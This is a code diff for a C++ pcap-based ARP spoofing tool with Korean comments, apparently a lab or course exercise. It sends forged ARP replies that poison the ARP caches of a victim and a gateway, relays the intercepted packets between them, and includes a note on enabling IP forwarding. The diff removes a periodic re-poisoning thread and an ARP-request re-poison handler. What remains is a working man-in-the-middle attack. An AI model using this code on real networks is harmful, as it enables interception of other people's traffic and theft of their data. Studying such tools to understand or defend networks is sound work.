@@ -19,7 +19,6 @@ void signalHandler(int) {
     running = false;
 }
 
-// 한 세션에 대해 피해자와 게이트웨이 양쪽에 ARP Reply 보내기
 void poisonSession(pcap_t* handle, const Mac& attackerMac, const Session& s) {
     auto send = [&](const Mac& dmac, Ip sip, const Mac& tmac, Ip tip){
         EthArpPacket pkt;
@@ -42,19 +41,8 @@ void poisonSession(pcap_t* handle, const Mac& attackerMac, const Session& s) {
         }
     };
 
-    // 1) 피해자(victim)에게: “게이트웨이 IP = attackerMac”
-    send(s.senderMac, s.targetIp, s.senderMac, s.senderIp);
-    // 2) 게이트웨이(target)에게: “피해자 IP = attackerMac”
-    send(s.targetMac, s.senderIp, s.targetMac, s.targetIp);
-}
-
-void poisonLoop(pcap_t* handle, const Mac& attackerMac) {
-    while (running) {
-        for (auto& s : sessions) {
-            poisonSession(handle, attackerMac, s);
-        }
-        std::this_thread::sleep_for(std::chrono::seconds(5));
-    }
+    send(s.senderMac, s.targetIp, s.senderMac, s.senderIp); // victim에게: gateway IP = attacker MAC
+    send(s.targetMac, s.senderIp, s.targetMac, s.targetIp); // gateway에게: victim IP = attacker MAC
 }
 
 void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int len) {
@@ -65,7 +53,6 @@ void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int 
     Ip sip(ntohl(ip->sip_)), dip(ntohl(ip->dip_));
 
     for (auto& s : sessions) {
-        // victim→gateway
         if (sip == s.senderIp && dip == s.targetIp) {
             auto buf = new u_char[len];
             memcpy(buf, raw, len);
@@ -76,7 +63,6 @@ void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int 
             delete[] buf;
             break;
         }
-        // gateway→victim
         if (sip == s.targetIp && dip == s.senderIp) {
             auto buf = new u_char[len];
             memcpy(buf, raw, len);
@@ -89,23 +75,6 @@ void relayPacket(pcap_t* handle, const Mac& attackerMac, const u_char* raw, int 
         }
     }
 }
-
-void handleArpRequest(pcap_t* handle, const Mac& attackerMac, const EthArpPacket* pkt) {
-    if (ntohs(pkt->arp_.op_) != ArpHdr::Request) return; // ARP Request가 아니면 무시
-
-    Ip sip(ntohl(pkt->arp_.sip_));
-    Ip tip(ntohl(pkt->arp_.tip_));
-
-    for (auto& s : sessions) {
-        // sender 또는 target이 ARP 요청 보냈는지 확인
-        if (sip == s.senderIp || sip == s.targetIp || tip == s.senderIp || tip == s.targetIp) {
-            poisonSession(handle, attackerMac, s); // 즉시 감염 재시도
-            printf("[!] Detected ARP Request - Re-poisoned %s <> %s\n",
-                   std::string(s.senderIp).c_str(), std::string(s.targetIp).c_str());
-        }
-    }
-}
-
 
 void relayLoop(pcap_t* handle, const Mac& attackerMac) {
     while (running) {
@@ -134,14 +103,12 @@ void relayLoop(pcap_t* handle, const Mac& attackerMac) {
                     }
                 }
             }
-            continue; // ARP 패킷은 릴레이하지 않음
+            continue;
         }
 
-        // IP 패킷 릴레이
         relayPacket(handle, attackerMac, pkt, hdr->len);
     }
 }
-
 
 int main(int argc, char* argv[]) {
     if (argc < 4 || (argc % 2) != 0) {
@@ -173,18 +140,16 @@ int main(int argc, char* argv[]) {
         Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
         Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
         sessions.push_back({ senderIp, senderMac, targetIp, targetMac });
+
         poisonSession(handle, attackerMac, sessions.back());
         printf("[*] Poisoned %s <> %s\n",
                std::string(senderIp).c_str(),
                std::string(targetIp).c_str());
     }
 
-    //   sudo sysctl -w net.ipv4.ip_forward=1
+    // 수동 포워딩 활성화 필요: sudo sysctl -w net.ipv4.ip_forward=1
 
-    std::thread t1(poisonLoop, handle, attackerMac);
-    std::thread t2(relayLoop,  handle, attackerMac);
-
-    t1.join();
+    std::thread t2(relayLoop, handle, attackerMac);
     t2.join();
 
     pcap_close(handle);
